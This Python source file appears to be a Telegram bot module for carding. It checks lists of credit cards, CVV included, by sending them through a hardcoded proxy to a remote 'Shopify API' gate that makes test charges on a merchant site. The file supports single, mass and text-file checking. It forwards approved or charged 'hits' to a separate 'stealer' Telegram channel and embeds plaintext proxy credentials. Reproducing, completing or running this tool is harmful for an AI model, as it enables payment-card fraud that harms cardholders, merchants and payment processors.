import time
import asyncio
import re
import os
import httpx
from urllib.parse import urlencode
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Shopify API"
API_BASE = "http://147.93.53.240:5010/"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# Default site (can be changed per request)
DEFAULT_SITE = "https://anseladams.org"

# Default proxy
DEFAULT_PROXY = "px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs"

# Owner DM link and clickable symbol
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

# -------------------------------------------------------------
# Helper Functions
# -------------------------------------------------------------
def luhn_check(card_number):
    digits = [int(ch) for ch in card_number if ch.isdigit()]
    if not digits:
        return False
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits) + sum((2 * d) - 9 if 2 * d > 9 else 2 * d for d in even_digits)
    return total % 10 == 0

def is_expired(month_str, year_str):
    try:
        mm = int(month_str)
        yy = int(year_str)
    except ValueError:
        return True
    from datetime import datetime
    current = datetime.now()
    current_yy = current.year % 100
    current_mm = current.month
    if yy < current_yy or (yy == current_yy and mm < current_mm):
        return True
    return False

def get_proxy_dict(proxy_str):
    parts = proxy_str.split(':')
    if len(parts) == 2:
        host, port = parts
        return {
            'http': f'http://{host}:{port}',
            'https': f'http://{host}:{port}'
        }
    elif len(parts) == 4:
        host, port, user, pwd = parts
        return {
            'http': f'http://{user}:{pwd}@{host}:{port}',
            'https': f'http://{user}:{pwd}@{host}:{port}'
        }
    else:
        return None

# -------------------------------------------------------------
# Stealer function (only gateway, response, time, checked by, owner)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, price, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ ${price}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# API caller
# -------------------------------------------------------------
async def call_shopify_api(fullcc, site_url=None, proxy=None):
    """Call Shopify API to check credit card"""
    if site_url is None:
        site_url = DEFAULT_SITE
    if proxy is None:
        proxy = DEFAULT_PROXY
    
    params = {'url': site_url, 'proxy': proxy}
    url = f"{API_BASE}?{fullcc}&{urlencode(params)}"
    
    proxy_dict = get_proxy_dict(proxy)
    
    async with httpx.AsyncClient(timeout=45, follow_redirects=True, proxies=proxy_dict) as session:
        for attempt in range(2):
            try:
                resp = await session.get(url)
                data = resp.json()
                
                response_msg = data.get("Response", "No response")
                charged = data.get("Charged", "False")
                approved = data.get("Approved", "False")
                price = data.get("Price", "N/A")
                
                resp_lower = response_msg.lower()
                
                # Check for charged (successful payment)
                if charged == "True" or "order completed" in resp_lower or "completed" in resp_lower:
                    return "Charged 💎", f"{response_msg} (${price})", GATE_NAME, price
                # Check for approved (auth only)
                elif approved == "True" or "otp_required" in resp_lower or "insufficient_funds" in resp_lower:
                    return "Approved ✅", f"{response_msg} (${price})", GATE_NAME, price
                # Check for declined
                elif "proxy dead" in resp_lower:
                    return "Error", "Proxy Dead - Retry with different proxy", GATE_NAME, price
                elif "card_declined" in resp_lower or "generic_declined" in resp_lower or "generic_decline" in resp_lower:
                    return "Declined ❌", f"{response_msg} (${price})", GATE_NAME, price
                elif "exhausted" in resp_lower:
                    return "Declined ❌", "All proxies/sites exhausted", GATE_NAME, price
                else:
                    return "Unknown ❓", f"{response_msg} (${price})", GATE_NAME, price
                    
            except Exception as e:
                if attempt == 1:
                    return "Error", f"Request failed: {str(e)[:30]}", GATE_NAME, "0"
                await asyncio.sleep(1)
    
    return "Error", "Request failed after multiple attempts", GATE_NAME, "0"

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/sh)
# -------------------------------------------------------------
@Client.on_message(filters.command("sh", [".", "/"]))
async def shopify_api_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /sh

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /sh cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        # Validate card
        if not luhn_check(cc):
            await message.reply_text("❌ Invalid card number (Luhn check failed)", quote=True)
            return
        if is_expired(mes, ano):
            await message.reply_text("❌ Card has expired", quote=True)
            return

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway, price = await call_shopify_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)

        if "Charged" in status or "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, price, time.perf_counter() - start, first_name, role)

        finalresp = f"""{status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""

        await Client.edit_message_text(
            message.chat.id, 
            thirdcheck.id, 
            finalresp, 
            disable_web_page_preview=True, 
            parse_mode=enums.ParseMode.HTML
        )
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/msh)
# -------------------------------------------------------------
@Client.on_message(filters.command("msh", [".", "/"]))
async def shopify_api_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /msh

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /msh cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        # Filter valid cards
        valid_ccs = []
        for cc_line in ccs:
            parts = cc_line.split('|')
            if len(parts) >= 3:
                num, mm, yy = parts[0], parts[1], parts[2]
                if luhn_check(num) and not is_expired(mm, yy):
                    valid_ccs.append(cc_line)
        
        if len(valid_ccs) != len(ccs):
            await message.reply(f"⚠️ Filtered out {len(ccs) - len(valid_ccs)} invalid/expired cards", quote=True)
        
        if not valid_ccs:
            await message.reply("❌ No valid cards found after Luhn/expiry check", quote=True)
            return

        if len(valid_ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            valid_ccs = valid_ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, valid_ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tsh)
# -------------------------------------------------------------
@Client.on_message(filters.command("tsh", [".", "/"]))
async def shopify_api_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tsh

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        # Filter valid cards
        valid_ccs = []
        for cc_line in ccs:
            parts = cc_line.split('|')
            if len(parts) >= 3:
                num, mm, yy = parts[0], parts[1], parts[2]
                if luhn_check(num) and not is_expired(mm, yy):
                    valid_ccs.append(cc_line)

        if len(valid_ccs) != len(ccs):
            await message.reply(f"⚠️ Filtered out {len(ccs) - len(valid_ccs)} invalid/expired cards", quote=True)

        if not valid_ccs:
            await message.reply("❌ No valid cards found after Luhn/expiry check", quote=True)
            return

        if len(valid_ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            valid_ccs = valid_ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, valid_ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING (with progress, separate approved messages, declined summary)
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    charged_count = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []  # will store both charged and approved

    # Initial progress message
    progress_text = f"""Shopify API
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Charged 💎: 0
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        status, response, gateway, price = await call_shopify_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        if "Charged" in status:
            charged_count += 1
            response_status = "CHARGED 💎"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "price": price,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, price, card_time, first_name, role)
        elif "Approved" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "price": price,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, price, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        # Update progress
        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Shopify API
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Charged 💎: {charged_count}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    # Send each approved/charged card as separate message
    for card in approved_cards:
        approved_msg = f"""{card['status']}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count + charged_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
💎 Charged: {charged_count}
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗦ᴜᴄᴄᴇꜱꜱꜰᴜʟ 𝗖ᴀʀᴅs

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
